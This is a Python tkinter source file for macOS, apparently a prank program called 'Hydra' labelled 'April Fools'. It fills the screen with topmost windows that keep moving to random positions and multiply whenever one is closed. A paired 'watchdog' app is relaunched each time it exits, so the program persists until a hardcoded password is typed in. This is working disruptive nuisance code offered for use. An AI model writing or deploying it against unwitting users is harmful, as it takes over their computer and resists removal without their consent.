# -*- coding: utf-8 -*-
  
import tkinter as tk
from tkinter import ttk
import threading, time, random as rm, os, psutil, subprocess, fcntl, sys

root = tk.Tk()
root.withdraw()

hashed = "kill"  # REMEMBER TO CHANGE PASSWORD
windows = []  # list of windows
entries = []  # list of entries
focused_window = None  # to track the focused window
stop_event = threading.Event()

nameoffile = "watchdog"
nameofotherfile = "hydra.app"
base_dir = os.path.dirname(os.path.abspath(sys.argv[0])).split('/')
base_dir.pop(0)
path = "/"

for i in range(len(base_dir)):
    if base_dir[i] == nameoffile or base_dir[i] == nameofotherfile:
        break
    else:
        path = os.path.join(path, base_dir[i])

temppath = nameoffile + ".app/Contents/MacOS/" + nameoffile
dogpath = os.path.join(path, temppath)
text_path = os.path.join(path, "hydra_var.txt")

def hydrafunc():
    def file_write(file_path, value):
        with open(file_path, 'w') as file:
            file.write(str(value))

    def file_read(file_path):
        with open(file_path, 'r') as file:
            return int(file.read())

    def remove():
        global entries
        for entry in entries:
            if entry.get() == hashed:
                file_write(text_path, 1)
                stop_event.set()
                sys.exit()

        result_label.config(text="Incorrect Password. Try again :)", foreground="red")
        spawner()

    def spawner():
        current_value = file_read(text_path)
        for _ in range(current_value):
            create_window()
            time.sleep(0.1)

    def create_window():
        global root, remove_entry, result_label, focused_window

        tempdata = file_read(text_path)
        file_write(text_path, tempdata + 1)

        Line1 = "Lol you actually fell for it"
        Line2 = "This is Hydra, chop one head off and it grows more"
        Line3 = "To kill it put in the password"
        Line4 = "The easy way is to ask me, the hard way is to check my GitHub"
        Line5 = "Good luck!"
        
        x = tk.Toplevel(root)
        windows.append(x)

        ttk.Label(x, text=Line1).pack(pady=5)
        ttk.Label(x, text=Line2).pack()
        ttk.Label(x, text=Line3).pack()
        ttk.Label(x, text=Line4).pack()
        ttk.Label(x, text=Line5).pack(pady=10)

        remove_entry = ttk.Entry(x)
        entries.append(remove_entry)
        remove_entry.pack(pady=20)

        ttk.Button(x, text="Remove", command=remove).pack(pady=5)

        result_label = ttk.Label(x)
        result_label.pack()

        x.title("April Fools")
        x.geometry(f'600x225-{rm.randint(0, x.winfo_screenwidth() - 600)}+{rm.randint(0, x.winfo_screenheight() - 175)}')
        x.resizable(False, False)
        x.attributes("-topmost", True)
        x.protocol("WM_DELETE_WINDOW", spawner)

        def focus_in(event):
            global focused_window
            focused_window = x

        def focus_out(event):
            global focused_window
            if focused_window == x:
                focused_window = None

        x.bind("<FocusIn>", focus_in)
        x.bind("<FocusOut>", focus_out)

        def move_windows():
            while not stop_event.is_set():
                if x != focused_window:
                    x.geometry(f'600x225-{rm.randint(0, x.winfo_screenwidth() - 600)}+{rm.randint(0, x.winfo_screenheight() - 175)}')
                time.sleep(0.1)

        threading.Thread(target=move_windows, daemon=True).start()

        x.deiconify()
        x.bell()

    data = file_read(text_path)
    if data > 2:
        spawner()
    else:
        create_window()

# Watchdog monitoring function
def watchthedog():
    global firstTime

    def find_or_start_process(process_name, firstTime, dogpath):
        process = None
        if firstTime:
            for p in psutil.process_iter(['name']):
                if p.info['name'] == process_name:
                    process = psutil.Process(p.pid)
                    break
        if process is None:
            process = subprocess.Popen([dogpath], stdin=subprocess.DEVNULL, preexec_fn=os.setsid)
        firstTime = False
        return process

    processname = "watchdog"
    process = find_or_start_process(processname, firstTime, dogpath)

    while not stop_event.is_set():
        if isinstance(process, subprocess.Popen):
            if process.poll() is not None:
                process = find_or_start_process(processname, firstTime, dogpath)
        elif isinstance(process, psutil.Process):
            if not process.is_running():
                process = find_or_start_process(processname, firstTime, dogpath)

        time.sleep(0.2)

# Check if the script is already running
def check_if_already_running():
    lock_file_path = "/tmp/hydra.lock"
    global lock_file
    lock_file = open(lock_file_path, 'w')
    try:
        fcntl.flock(lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except IOError:
        sys.exit(1)

# Create and start threads
if __name__ == "__main__":
    check_if_already_running()
    
    Hydra = threading.Thread(target=hydrafunc)
    Watchdog = threading.Thread(target=watchthedog)
    
    Hydra.start()
    Watchdog.start()

    while not stop_event.is_set():
        root.mainloop()

    root.destroy()
    Hydra.join()
    Watchdog.join()
